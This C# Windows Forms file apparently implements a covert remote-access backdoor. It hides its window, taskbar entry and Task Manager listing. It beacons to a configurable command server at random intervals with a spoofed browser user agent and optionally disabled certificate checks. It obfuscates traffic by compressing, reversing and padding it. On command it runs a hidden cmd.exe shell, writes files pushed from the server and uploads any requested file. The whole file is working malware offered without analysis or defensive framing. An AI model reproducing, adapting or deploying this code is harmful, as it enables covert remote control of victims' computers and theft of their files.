using HBS.HBS;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.IO.Compression;

namespace HBS
{
    public partial class Main : Form
    {
        // Global
        ProcessStartInfo startInfo;
        Process readProcess;
        ProcessIoManager processIoMgr;
        String outputBuffer = "";
        int started = 0;
        int active = 0;

        private void OnStdoutTextRead(string text)
        {
            if (!String.IsNullOrEmpty(text))
            {
                outputBuffer += text;
            }
        }

        private void OnStderrTextRead(string text)
        {
            if (!String.IsNullOrEmpty(text))
            {
                outputBuffer += text;
            }
        }

        public Main()
        {
            // Init 
            InitializeComponent();
            // Check if one instance of process is already running
            if (Process.GetProcesses().Count(p => p.ProcessName == Process.GetCurrentProcess().ProcessName) > 1)
                Environment.Exit(0);
            // Set state to minimized
            this.WindowState = FormWindowState.Minimized;
            this.Opacity = 0.0;
            // Hide app from taskbar
            this.ShowInTaskbar = false;
            
        }
        
        public void Start()
        {
            startInfo = new ProcessStartInfo("cmd.exe");
            readProcess = new Process();
            // Init shell process
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardError = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.StandardOutputEncoding = Encoding.GetEncoding(437);
            readProcess.StartInfo = startInfo;
            readProcess.Start();
            processIoMgr = new ProcessIoManager(readProcess);
            // Add event handlers in order to be notified of stdout/stderr text read: 
            processIoMgr.StderrTextRead += new StringReadEventHandler(OnStderrTextRead);
            processIoMgr.StdoutTextRead += new StringReadEventHandler(OnStdoutTextRead);
            // Tell the manager to start monitoring the output 
            processIoMgr.StartProcessOutputRead();
            // Add code to the OnStderrTextRead() and OnStdoutTextRead() methods
            // to handle the text that has been read from the streams. 

        }

        // Hide app from task manager
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }
        
        private void button1_Click(object sender, EventArgs e)
        {

        }

        // Ask server for instructions
        private bool Fetch()
        {
            try
            {
                if (Config.AllowInsecureCertificate)
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url));
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                req.Headers.Add("Accept-Encoding","gzip, deflate, br");
                

                var buffer = default(byte[]);
                using (var memstream = new MemoryStream())
                {
                    req.GetResponse().GetResponseStream().CopyTo(memstream);
                    buffer = memstream.ToArray();
                }

                String cmd = null;
                if (buffer.Length != 0)
                {
                    Array.Reverse(buffer);
                    buffer = GZDecompress(buffer);
                    cmd = Encoding.ASCII.GetString(buffer);
                    cmd = cmd.Replace("XXPADDINGXXPADDINGXXPADDINGXX", "");
                    if (started == 1 && cmd == "EXITSH\r\n")
                    {
                        //STOP output monitoring (disposes of the reader threads) 
                        processIoMgr.StopMonitoringProcessOutput();
                        readProcess.StandardInput.WriteLine("exit");
                        readProcess.WaitForExit();
                        started = 0;
                        outputBuffer += "EXITSH OK.\n";
                        Reply();
                    }
                    else if (started == 0 && cmd == "STARTSH\r\n")
                    {
                        Start();
                        started = 1;
                    }
                    else if (cmd == "EXITPROC\r\n")
                    {
                        outputBuffer += "EXITPROC OK.\n";
                        Reply();
                        Environment.Exit(0);
                    }
                    else if (cmd == "ACTIVE\r\n")
                    {
                        active = 1;
                        outputBuffer += "ACTIVE OK.\n";
                        Reply();
                    }
                    else if (cmd == "INACTIVE\r\n")
                    {
                        active = 0;
                        outputBuffer += "INACTIVE OK.\n";
                        Reply();
                    }
                    else if (cmd.StartsWith("SLEEP")){
                        // cmd will be SLEEP 30, SLEEP 60 or SLEEP 120...
                        outputBuffer += "SLEEP OK.\n";
                        Reply();
                        int duration = Int32.Parse(cmd.Substring(6));
                        Thread.Sleep(TimeSpan.FromMinutes(duration));
                    }
                    else if (cmd.StartsWith("FILED"))
                    {
                        // skip padding and FILE
                        buffer = System.Convert.FromBase64String(cmd.Substring(6));
                        File.WriteAllBytes("file.dat", buffer);
                        outputBuffer += "FILED OK.\n";
                        Reply();
                    }
                    else if (cmd.StartsWith("FILEU"))
                    {
                        // remove FILEU and /r/n
                        String filepath = cmd.Substring(6, cmd.Length - 8);
                        buffer = File.ReadAllBytes(filepath);
                        String strBuffer = System.Convert.ToBase64String(buffer);
                        outputBuffer += "FILEU " + strBuffer;
                        Reply();
                        outputBuffer += "FILE U OK.\n";
                        Reply();
                    }
                    else if (started == 1)
                    {
                        readProcess.StandardInput.Write(cmd);
                        readProcess.StandardInput.Flush();
                    }
                }
                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex);
                return false;
            }
        }

        // Reply to server with result
        private bool Reply()
        {
            String responseString;
            try
            {
                String reply = null;
                if (Config.AllowInsecureCertificate)
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url));
                req.Method = "POST";
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                req.Headers.Add("Accept-Encoding", "gzip, deflate, br");

                if (outputBuffer.Length > 0)
                {

                    reply = outputBuffer;
                    outputBuffer = "";

                    Byte[] replyByte = Encoding.ASCII.GetBytes("XXPADDINGXXPADDINGXXPADDINGXX" + reply);
                    byte[] compressedReply = GZCompress(replyByte);
                    Array.Reverse(compressedReply);
                    req.ContentLength = compressedReply.Length;
                    Stream dataStream = req.GetRequestStream();
                    dataStream.Write(compressedReply, 0, compressedReply.Length);
                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    using (Stream stream = resp.GetResponseStream())
                    {
                        StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                        responseString = reader.ReadToEnd();
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        


        private void Main_Load(object sender, EventArgs e)
        {
            outputBuffer += Dns.GetHostName() + " Connected.\n";
            while (true)
            {
                try
                {
                    // Random delay between fetchs
                    Random rnd = new Random();
                    int delay = 0;
                    if (active == 1)
                    {
                        delay = rnd.Next(Config.MinActiveDelay, Config.MaxActiveDelay);
                    }else
                    {
                        delay = rnd.Next(Config.MinInactiveDelay, Config.MaxInactiveDelay);
                    }
                    Thread.Sleep(TimeSpan.FromSeconds(delay));
                    Fetch();
                    // Or reply to server with cmd result
                    Thread.Sleep(1000);
                    Reply();
                }
                // Exit if error
                catch(Exception ex)
                {
                    Console.WriteLine(ex);
                    Environment.Exit(0);
                }
            }
        }

        private void Main_Click(object sender, EventArgs e)
        {

        }

        private void Button1_Click_1(object sender, EventArgs e)
        {

        }

        static byte[] GZCompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream())
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Compress))
            {
                zipStream.Write(data, 0, data.Length);
                zipStream.Close();
                return compressedStream.ToArray();
            }
        }

        static byte[] GZDecompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                zipStream.CopyTo(resultStream);
                return resultStream.ToArray();
            }
        }
    }
}
